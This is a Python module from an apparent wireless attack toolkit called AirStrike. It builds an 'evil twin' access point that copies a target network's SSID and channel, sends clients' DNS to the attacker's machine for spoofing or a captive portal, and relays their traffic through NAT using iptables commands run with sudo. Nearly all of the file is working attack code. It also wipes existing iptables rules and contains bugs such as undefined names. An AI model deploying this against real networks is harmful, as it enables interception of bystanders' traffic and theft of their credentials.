# AirStrike/core_attacks/evil_twin.py
import os
import sys
import time
import subprocess
import tempfile # For temporary config files

# --- Path Setup & Utility Imports ---
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

try:
    from utils.network_utils import set_monitor_mode, set_managed_mode, run_with_sudo
except ImportError as e:
    print(f"ERROR (evil_twin.py): Failed to import utils: {e}")
    def set_monitor_mode(iface): print(f"Placeholder: set_monitor_mode({iface})"); return False
    def set_managed_mode(iface): print(f"Placeholder: set_managed_mode({iface})"); return True
    def run_with_sudo(cmd, timeout=30): return False, "", "Placeholder: run_with_sudo error"


# --- Helper Functions for Evil Twin ---

def create_hostapd_config_content(interface, ssid, channel, driver="nl80211", hw_mode="g", extra_opts=None):
    """Generates content for hostapd.conf."""
    content = f"""
interface={interface}
driver={driver}
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
#wpa=2
#wpa_passphrase=YourPasswordHere # Example for WPA2, remove for open AP
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP CCMP
#rsn_pairwise=CCMP
"""
    if extra_opts: # For advanced configs like WPA/WPA2
        content += "\n" + "\n".join(extra_opts)
    return content

def create_dnsmasq_config_content(interface, ip_address="10.0.0.1", dhcp_range_start="10.0.0.10", dhcp_range_end="10.0.0.50", lease_time="12h"):
    """Generates content for dnsmasq.conf."""
    return f"""
interface={interface}
dhcp-range={dhcp_range_start},{dhcp_range_end},{lease_time}
dhcp-option=3,{ip_address} # Gateway
dhcp-option=6,{ip_address} # DNS Server (points to self, for captive portal or DNS spoofing)
# To use external DNS:
# server=8.8.8.8
# server=1.1.1.1
log-queries
log-dhcp
# For captive portal, redirect all DNS queries for non-local domains to the AP's IP
# address=/#/{ip_address}
"""

def setup_evil_twin_network_interface(interface, ip_address="10.0.0.1", netmask="255.255.255.0", log_callback=None, attack_id=None):
    """Configures the network interface for the Evil Twin AP."""
    def log(msg):
        if log_callback and attack_id: log_callback(attack_id, f"[NetSetup] {msg}")
        else: print(f"[NetSetup] {msg}")

    log(f"Configuring interface '{interface}' with IP {ip_address}/{netmask}")
    cmds = [
        f"ifconfig {interface} {ip_address} netmask {netmask} up",
        # f"route add -net {ip_address.rsplit('.', 1)[0]}.0 netmask {netmask} gw {ip_address}" # May not be needed if interface is gateway
    ]
    for cmd in cmds:
        success, out, err = run_with_sudo(cmd) # run_with_sudo handles sudo
        if not success:
            log(f"Error executing '{cmd}': {err} - STDOUT: {out}")
            return False
    log(f"Interface '{interface}' configured.")
    return True

def enable_ip_forwarding_and_nat(wan_interface, lan_interface, log_callback=None, attack_id=None):
    """Enables IP forwarding and sets up NAT/MASQUERADE for internet sharing."""
    def log(msg):
        if log_callback and attack_id: log_callback(attack_id, f"[NATSetup] {msg}")
        else: print(f"[NATSetup] {msg}")
    
    log("Enabling IP forwarding...")
    success, _, err = run_with_sudo("sysctl -w net.ipv4.ip_forward=1")
    if not success: log(f"Error enabling IP forwarding: {err}"); return False

    log("Flushing existing iptables rules (NAT table)...")
    run_with_sudo("iptables -F -t nat") # Flush FORWARD chain and NAT table
    run_with_sudo("iptables -F FORWARD")

    log(f"Setting up MASQUERADE on '{wan_interface}' for traffic from '{lan_interface}'...")
    cmd_masquerade = f"iptables -t nat -A POSTROUTING -o {wan_interface} -j MASQUERADE"
    success, _, err = run_with_sudo(cmd_masquerade)
    if not success: log(f"Error setting MASQUERADE rule: {err}"); return False
    
    cmd_forward_lan_wan = f"iptables -A FORWARD -i {lan_interface} -o {wan_interface} -m state --state RELATED,ESTABLISHED -j ACCEPT"
    success, _, err = run_with_sudo(cmd_forward_lan_wan)
    if not success: log(f"Error setting FORWARD LAN->WAN rule: {err}"); return False

    cmd_forward_wan_lan = f"iptables -A FORWARD -i {wan_interface} -o {lan_interface} -j ACCEPT" # Simplified, adjust if too permissive
    success, _, err = run_with_sudo(cmd_forward_wan_lan)
    if not success: log(f"Error setting FORWARD WAN->LAN rule: {err}"); return False
    
    log("IP forwarding and NAT configured.")
    return True

# --- Main Evil Twin Worker ---
def evil_twin_worker(attack_id, network_params, attack_config_params, log_callback, status_callback, stop_event, app_config):
    """
    Worker function for creating an Evil Twin access point.
    """
    ap_interface = app_config.get('DEFAULT_INTERFACE', 'wlan0') # Interface for hostapd
    # WAN interface for internet sharing (needs to be configured or auto-detected)
    wan_interface = attack_config_params.get('wan_interface', 'eth0') # User might need to specify this

    log_callback(attack_id, f"Evil Twin worker started. AP Interface: {ap_interface}, WAN Interface: {wan_interface}")
    status_callback(attack_id, "initializing", 5)

    target_ssid = network_params.get('essid', 'AirStrike_EvilTwin')
    target_channel_str = network_params.get('channel', '6') # Default channel 6
    
    # Evil Twin specific configs
    ap_ip_address = attack_config_params.get('ap_ip', '10.0.0.1')
    # enable_captive_portal = attack_config_params.get('captive_portal', False) # For future use

    try:
        target_channel = int(target_channel_str)
    except ValueError:
        log_callback(attack_id, f"Error: Invalid channel '{target_channel_str}'.")
        status_callback(attack_id, "failed", 0)
        return

    log_callback(attack_id, f"Configuring Evil Twin: SSID='{target_ssid}', Channel={target_channel}, AP_IP='{ap_ip_address}'")
    status_callback(attack_id, "configuring_ap", 10)

    # --- Create temporary config files ---
    tmp_dir = tempfile.mkdtemp(prefix="airstrike_eviltwin_")
    log_callback(attack_id, f"Temporary config directory: {tmp_dir}")

    hostapd_conf_path = os.path.join(tmp_dir, "hostapd.conf")
    dnsmasq_conf_path = os.path.join(tmp_dir, "dnsmasq.conf")

    hostapd_content = create_hostapd_config_content(ap_interface, target_ssid, target_channel)
    dnsmasq_content = create_dnsmasq_config_content(ap_interface, ip_address=ap_ip_address)

    try:
        with open(hostapd_conf_path, "w") as f: f.write(hostapd_content)
        with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_content)
        log_callback(attack_id, "hostapd and dnsmasq config files created.")
    except IOError as e:
        log_callback(attack_id, f"Error writing config files: {e}")
        status_callback(attack_id, "failed", 15)
        if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
        return

    # --- Setup Network and Services ---
    # 0. Ensure interface is not in monitor mode (hostapd needs managed/AP mode capabilities)
    #    Some drivers might allow hostapd on monitor-mode capable interfaces directly.
    #    Forcing managed might be safer if driver is tricky.
    if is_monitor_mode(ap_interface): # Assuming is_monitor_mode is available from utils
        log_callback(attack_id, f"Interface '{ap_interface}' is in monitor mode. Setting to managed.")
        if not set_managed_mode(ap_interface):
            log_callback(attack_id, f"Error: Failed to set '{ap_interface}' to managed mode for hostapd.")
            status_callback(attack_id, "failed", 18)
            if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
            return

    # 1. Configure AP interface IP
    if not setup_evil_twin_network_interface(ap_interface, ap_ip_address, log_callback=log_callback, attack_id=attack_id):
        log_callback(attack_id, "Error: Failed to configure AP network interface.")
        status_callback(attack_id, "failed", 20)
        if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
        return
    status_callback(attack_id, "configuring_nat", 25)

    # 2. Enable IP forwarding and NAT (if wan_interface is provided and different)
    if wan_interface and wan_interface != ap_interface :
        if not enable_ip_forwarding_and_nat(wan_interface, ap_interface, log_callback=log_callback, attack_id=attack_id):
            log_callback(attack_id, "Error: Failed to configure IP forwarding/NAT. Internet sharing may not work.")
            # This might not be a fatal error if internet sharing isn't strictly required for the attack type
        else:
            log_callback(attack_id, "IP forwarding and NAT enabled for internet sharing.")
    else:
        log_callback(attack_id, "Skipping NAT setup (no distinct WAN interface or same as AP interface).")
    
    status_callback(attack_id, "starting_services", 30)

    # --- Start hostapd and dnsmasq processes ---
    hostapd_process = None
    dnsmasq_process = None
    
    # Commands need to be run with sudo if script isn't already root.
    # run_with_sudo handles blocking calls. For daemons, Popen is better.
    # Assuming root context from run_web.py, direct Popen might work if tools are in PATH.
    # For safety, explicitly use 'sudo' if not root.
    sudo_prefix = [] if os.geteuid() == 0 else ['sudo']

    try:
        log_callback(attack_id, f"Starting hostapd with config: {hostapd_conf_path}")
        hostapd_cmd = sudo_prefix + ["hostapd", "-B", hostapd_conf_path] # -B runs in background
        # For debugging hostapd, remove -B and capture output or use -dd options.
        # hostapd_process = subprocess.Popen(hostapd_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Using run_with_sudo for simplicity, though Popen is better for daemons if output needs monitoring.
        h_success, h_out, h_err = run_with_sudo(" ".join(hostapd_cmd), timeout=10) # Short timeout for startup
        if not h_success: # Check if hostapd started. -B makes it tricky. Check logs or ps.
            log_callback(attack_id, f"hostapd potentially failed to start. Error: {h_err}. Output: {h_out}. Check system logs for hostapd.")
            # It's hard to definitively know if hostapd -B succeeded immediately.
            # A better check would be to see if the interface is up and SSID is broadcast.
            # For now, we'll proceed with a warning.
        else:
            log_callback(attack_id, "hostapd started (or command issued).")
        status_callback(attack_id, "running_hostapd", 40)
        time.sleep(3) # Give hostapd time to start

        log_callback(attack_id, f"Starting dnsmasq with config: {dnsmasq_conf_path}")
        dnsmasq_cmd = sudo_prefix + ["dnsmasq", "-C", dnsmasq_conf_path, "--no-daemon"] # --no-daemon for Popen monitoring
        dnsmasq_process = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        log_callback(attack_id, f"dnsmasq process started (PID: {dnsmasq_process.pid}).")
        status_callback(attack_id, "running", 50) # Evil Twin is now "running"

        # --- Monitor services and stop_event ---
        while not stop_event.is_set():
            if dnsmasq_process.poll() is not None:
                log_callback(attack_id, f"dnsmasq process terminated unexpectedly (code: {dnsmasq_process.returncode}).")
                # Read remaining output
                dns_out, dns_err = dnsmasq_process.communicate()
                log_callback(attack_id, f"dnsmasq STDOUT: {dns_out}")
                log_callback(attack_id, f"dnsmasq STDERR: {dns_err}")
                status_callback(attack_id, "failed", dnsmasq_process.returncode or 70)
                break
            # Check hostapd status (e.g., by checking if process exists) - more complex
            # For now, assume hostapd stays up if dnsmasq is up.
            time.sleep(1)

        if stop_event.is_set():
            log_callback(attack_id, "Stop event received for Evil Twin.")
            status_callback(attack_id, "stopping", 90)

    except FileNotFoundError as fnf_err:
        log_callback(attack_id, f"Error: Required command not found (hostapd or dnsmasq?). {fnf_err}")
        status_callback(attack_id, "failed", 20)
    except Exception as e:
        log_callback(attack_id, f"An error occurred during Evil Twin setup/run: {e}")
        status_callback(attack_id, "failed", 25)
    finally:
        log_callback(attack_id, "Cleaning up Evil Twin...")
        if dnsmasq_process and dnsmasq_process.poll() is None:
            log_callback(attack_id, "Terminating dnsmasq...")
            dnsmasq_process.terminate()
            try: dnsmasq_process.wait(timeout=5)
            except subprocess.TimeoutExpired: dnsmasq_process.kill()
        
        # Kill hostapd (since it was started with -B or might be managed by run_with_sudo)
        log_callback(attack_id, "Stopping hostapd (using killall)...")
        run_with_sudo("killall hostapd") # More forceful way to stop backgrounded hostapd
        time.sleep(1)

        log_callback(attack_id, "Restoring iptables (flushing NAT and FORWARD)...")
        run_with_sudo("iptables -F -t nat")
        run_with_sudo("iptables -F FORWARD")
        # Optionally, disable IP forwarding
        # run_with_sudo("sysctl -w net.ipv4.ip_forward=0")

        log_callback(attack_id, f"Restoring interface '{ap_interface}' to managed mode.")
        if not set_managed_mode(ap_interface): # This should use run_with_sudo
            log_callback(attack_id, f"Warning: Failed to restore '{ap_interface}' to managed mode.")

        if os.path.exists(tmp_dir):
            try:
                import shutil
                shutil.rmtree(tmp_dir)
                log_callback(attack_id, f"Temporary directory '{tmp_dir}' removed.")
            except Exception as e_clean:
                log_callback(attack_id, f"Error removing temp directory '{tmp_dir}': {e_clean}")
        
        final_status = "stopped" if stop_event.is_set() else (_active_attacks.get(attack_id, {}).get('status', 'unknown_end'))
        if final_status not in ["completed", "failed", "stopped"]:
             status_callback(attack_id, "stopped" if stop_event.is_set() else "completed_unknown", 100)
        log_callback(attack_id, "Evil Twin worker finished.")

